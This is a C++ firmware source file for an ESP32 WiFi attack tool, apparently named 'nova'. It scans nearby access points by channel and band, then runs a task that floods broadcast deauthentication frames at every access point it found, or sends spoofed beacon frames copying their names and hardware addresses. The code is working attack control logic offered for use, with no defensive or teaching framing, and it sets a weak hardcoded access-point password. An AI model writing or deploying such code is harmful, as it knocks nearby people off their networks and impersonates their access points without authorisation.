#include "wifi_manager.h"
#include "lib/core/nvs_util.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_wifi_types_generic.h"
#include "freertos/idf_additions.h"
#include "freertos/event_groups.h"
#include "freertos/projdefs.h"
#include "esp_task_wdt.h"
#include "esp_random.h"
#include "version.h"
#include <cstdint>
#include <cstring>
#include <sys/types.h>
#include <vector>

#include "lib/module/wifi/deauth.h"
#include "lib/module/wifi/beacon.h"

#define SCAN_DONE_BIT BIT0

static const char* TAG = "==== wifi_ctrl ====\n";

static EventGroupHandle_t scan_event_group = nullptr;

static void scan_done_handler(void*, esp_event_base_t, int32_t, void*) {
    if (scan_event_group) {
        xEventGroupSetBits(scan_event_group, SCAN_DONE_BIT);
    }
}

wifi_config_t core::ap_config = {
    .ap ={
        .ssid = "nova_x_ap", // Change here
        .password = "123456789",
        .ssid_len = (uint8_t)strlen("nova_x_ap"),
        .channel = 1,
        .authmode = WIFI_AUTH_WPA2_PSK,
        .max_connection = 4,
        .beacon_interval = 100,
        .pmf_cfg = {.capable = false, .required = false},
    },
};

void core::wifi_ctrl::disable_wdt(bool enabled){
    const char *op = enabled ? "disabling" : "enabling";
    ESP_LOGI(TAG, "%s wdt..", op);
    esp_task_wdt_config_t wdt_cfg = {
        .timeout_ms = enabled ? (uint)10000 : 5000,
        .idle_core_mask = enabled ? (uint)0 : (1 << portNUM_PROCESSORS) - 1,
        .trigger_panic = true,
    };
    esp_task_wdt_reconfigure(&wdt_cfg);
    ESP_LOGI(TAG, "success to %s wdt", op);
}

void core::wifi_ctrl::select_band_map(std::map<uint8_t, std::vector<ap_t>>& out_map) {
    out_map.clear();

    if (attack_band_type == ATTACK_TYPE_24GHZ || attack_band_type == ATTACK_TYPE_ALL) {
        out_map.insert(channel_ap_map_2ghz.begin(), channel_ap_map_2ghz.end());
    }
    
    if (attack_band_type == ATTACK_TYPE_5GHZ || attack_band_type == ATTACK_TYPE_ALL) {
        for (const auto& [ch, aps] : channel_ap_map_5ghz) {
            auto& target_v = out_map[ch];
            target_v.insert(target_v.end(), aps.begin(), aps.end());
        }
    }
}
[[nodiscard]]core::wifi_ctrl& core::wifi_ctrl::instance(){
    static core::wifi_ctrl instance_;
    return instance_;
}

core::wifi_ctrl::wifi_ctrl(){
    ESP_LOGI(TAG,"==== NOVA KRNEL VERSION : %s ===",KERNEL_VERSION);
    ESP_LOGI(TAG, "initing wifi_ctrl");

    core::ensure_nvs_init();

    esp_netif_init();
    esp_event_loop_create_default();

    esp_netif_create_default_wifi_sta();

    vTaskDelay(pdMS_TO_TICKS(200));

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);

    esp_err_t band_ret = esp_wifi_set_band_mode(WIFI_BAND_MODE_2G_ONLY);
    ESP_LOGI(TAG, "set_band_mode ret: %d", band_ret);

    vTaskDelay(pdMS_TO_TICKS(200));

    esp_wifi_set_mode(WIFI_MODE_STA);

    vTaskDelay(pdMS_TO_TICKS(200));

    esp_wifi_start();

    ESP_LOGI(TAG,"wifi_ctrl interface init done");
}

core::wifi_ctrl::~wifi_ctrl(){
    ESP_LOGI(TAG,"wifi_ctrl dead");
    return;
}

//store to ap map
[[nodiscard]]bool core::wifi_ctrl::scan(){
    ESP_LOGI(TAG,"initializing scan config");

    disable_wdt(true);

    scan_event_group = xEventGroupCreate();

    esp_event_handler_instance_t scan_done_instance;
    esp_event_handler_instance_register(WIFI_EVENT, WIFI_EVENT_SCAN_DONE,
                                        scan_done_handler, nullptr, &scan_done_instance);

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    vTaskDelay(pdMS_TO_TICKS(100));

    wifi_scan_config_t scan_config = {
        .ssid = 0,
        .bssid = 0,
        .channel = 0,
        .show_hidden = true,
    };

    ESP_LOGI(TAG,"scanning wifi...");
    esp_err_t rst = esp_wifi_scan_start(&scan_config, false);

    if(rst != ESP_OK){
        ESP_LOGE(TAG, "scan failed (reason code: %d)",rst);
        esp_event_handler_instance_unregister(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, scan_done_instance);
        vEventGroupDelete(scan_event_group);
        scan_event_group = nullptr;
        return false;
    }
    xEventGroupWaitBits(scan_event_group, SCAN_DONE_BIT, pdTRUE, pdTRUE, pdMS_TO_TICKS(10000));

    esp_event_handler_instance_unregister(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, scan_done_instance);
    vEventGroupDelete(scan_event_group);
    scan_event_group = nullptr;

    disable_wdt(false);

    esp_wifi_scan_get_ap_num(&total_ap_num);
    if(total_ap_num != 0) ESP_LOGI(TAG, "total ap num : %d", total_ap_num);

    else{
        ESP_LOGI(TAG,"no aps.. \n scan cancel");
        return false;
    }

    wifi_ap_record_t *ap_info_list = (wifi_ap_record_t*)calloc(total_ap_num,sizeof(wifi_ap_record_t));
    if(ap_info_list == nullptr) {
        ESP_LOGI(TAG,"failed to init ap_info_list(wifi_ap_record_t*)");
        return false;
    }

    esp_wifi_scan_get_ap_records(&total_ap_num,ap_info_list);

    ESP_LOGI(TAG,"clearing ap_maps");
    channel_ap_map_2ghz.clear();
    channel_ap_map_5ghz.clear();

    for (uint16_t i = 0; i < total_ap_num; i++){
        const wifi_ap_record_t& rec = ap_info_list[i];
        uint8_t ch = rec.primary;
        ap_t ap(rec.bssid, (const char*)rec.ssid, rec.authmode);

        if (ch >= 1 && ch <= 13) channel_ap_map_2ghz[ch].push_back(ap);
        else if (ch > 13) channel_ap_map_5ghz[ch].push_back(ap);
    }
    ESP_LOGI(TAG,"done to save ap_maps");
    free(ap_info_list);
    ESP_LOGI(TAG,"success to free ap_info_list");

    esp_wifi_set_mode(WIFI_MODE_STA);
    vTaskDelay(pdMS_TO_TICKS(100));

    ESP_LOGI(TAG,"wifi scan done");
    
    if(!scan_status){
        ESP_LOGI(TAG,"updating scan_status..");
        scan_status = true;
    }
    
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    return true;
}

namespace {

constexpr const char* ATK_TAG = "==== wifi_attack ====\n";
constexpr int ATK_LOG_INTERVAL_MS = 5000;

std::atomic<bool> attack_running{false};
core::wifi_attack_type current_attack = core::wifi_attack_type::deauth;
volatile uint32_t attack_pkt_count = 0;

TaskHandle_t attack_task = nullptr;
SemaphoreHandle_t attack_exit_sem = nullptr;
esp_timer_handle_t attack_log_timer = nullptr;

const char* attack_type_name(core::wifi_attack_type t) {
    switch (t) {
        case core::wifi_attack_type::deauth: return "Deauth";
        case core::wifi_attack_type::beacon: return "Beacon";
        default:                             return "Unknown";
    }
}

void attack_log_timer_cb(void*) {
    ESP_LOGI(ATK_TAG, "WiFi Attack (%s): %lu packets",
             attack_type_name(current_attack), (unsigned long)attack_pkt_count);
}

void attack_task_fn(void*) {
    static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    auto& w = core::wifi_ctrl::instance();

    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(300));

    w.disable_wdt(true);

    std::map<uint8_t, std::vector<core::ap_t>> map;
    w.select_band_map(map);

    ESP_LOGI(ATK_TAG, "%s attack started", attack_type_name(current_attack));

    while (attack_running) {
        for (const auto& [ch, aps] : map) {
            if (!attack_running) break;

            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(pdMS_TO_TICKS(20));

            for (const auto& ap : aps) {
                if (!attack_running) break;

                switch (current_attack) {
                    case core::wifi_attack_type::deauth:
                        for (int i = 0; i < MAX_DEAUTH_PER_PKT; i++)
                            module::deauth::send_frame(ap.bssid.data(), broadcast, 0x07);
                        attack_pkt_count += MAX_DEAUTH_PER_PKT;
                        break;

                    case core::wifi_attack_type::beacon:
                        module::beacon::send_frame(ap.bssid.data(), ap.ssid.c_str(),ch, ap.authmode);
                        attack_pkt_count++;
                        break;
                }
                vTaskDelay(pdMS_TO_TICKS(5));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    w.disable_wdt(false);
    esp_wifi_set_mode(WIFI_MODE_STA);

    ESP_LOGI(ATK_TAG, "%s attack stopped", attack_type_name(current_attack));

    if (attack_task == xTaskGetCurrentTaskHandle()) attack_task = nullptr;
    if (attack_exit_sem) xSemaphoreGive(attack_exit_sem);
    vTaskDelete(nullptr);
}

}

void core::wifi_ctrl::attack_start(wifi_attack_type type) {
    
    if (attack_running) attack_stop();

    if (!scan_status_checker()) return;

    if (!attack_exit_sem)
        attack_exit_sem = xSemaphoreCreateBinary();
    if (attack_exit_sem)
        xSemaphoreTake(attack_exit_sem, 0);

    current_attack = type;
    attack_pkt_count = 0;
    attack_running = true;
    running = true;

    if (xTaskCreate(attack_task_fn, "wifi_attack", 4096,
                    nullptr, 5, &attack_task) != pdPASS) {
        ESP_LOGE(TAG, "failed to create attack task");
        attack_running = false;
        running = false;
        attack_task = nullptr;
        return;
    }

    if (!attack_log_timer) {
        esp_timer_create_args_t args{};
        args.callback = attack_log_timer_cb;
        args.name = "atk_log";
        esp_timer_create(&args, &attack_log_timer);
    }
    if (attack_log_timer)
        esp_timer_start_periodic(attack_log_timer,
                                 static_cast<uint64_t>(ATK_LOG_INTERVAL_MS) * 1000);

    ESP_LOGI(TAG, "WiFi %s attack started", attack_type_name(type));
    ESP_LOGI(TAG,"WiFi attack band type :%d",attack_band_type);
}

void core::wifi_ctrl::attack_stop() {
    bool had_task = (attack_task != nullptr);
    if (!attack_running && !had_task) return;

    attack_running = false;
    running = false;

    if (attack_log_timer) esp_timer_stop(attack_log_timer);

    if (had_task) {
        bool exited = false;
        if (attack_exit_sem)
            exited = (xSemaphoreTake(attack_exit_sem, pdMS_TO_TICKS(2000)) == pdTRUE);
        else
            vTaskDelay(pdMS_TO_TICKS(200));

        if (!exited && attack_task && eTaskGetState(attack_task) != eDeleted) {
            ESP_LOGW(TAG, "attack task exit timed out, forcing");
            vTaskDelete(attack_task);
            attack_task = nullptr;
        }
    }

    ESP_LOGI(TAG, "WiFi attack stopped");
}

[[nodiscard]]bool core::wifi_ctrl::get_attack_status(void) const {
    return attack_running.load();
}

[[nodiscard]]bool core::wifi_ctrl::scan_status_checker(void) const {
    if(!scan_status){
        ESP_LOGI(TAG,"scan not init,scan first");
        return false;
    }
    else return true;
};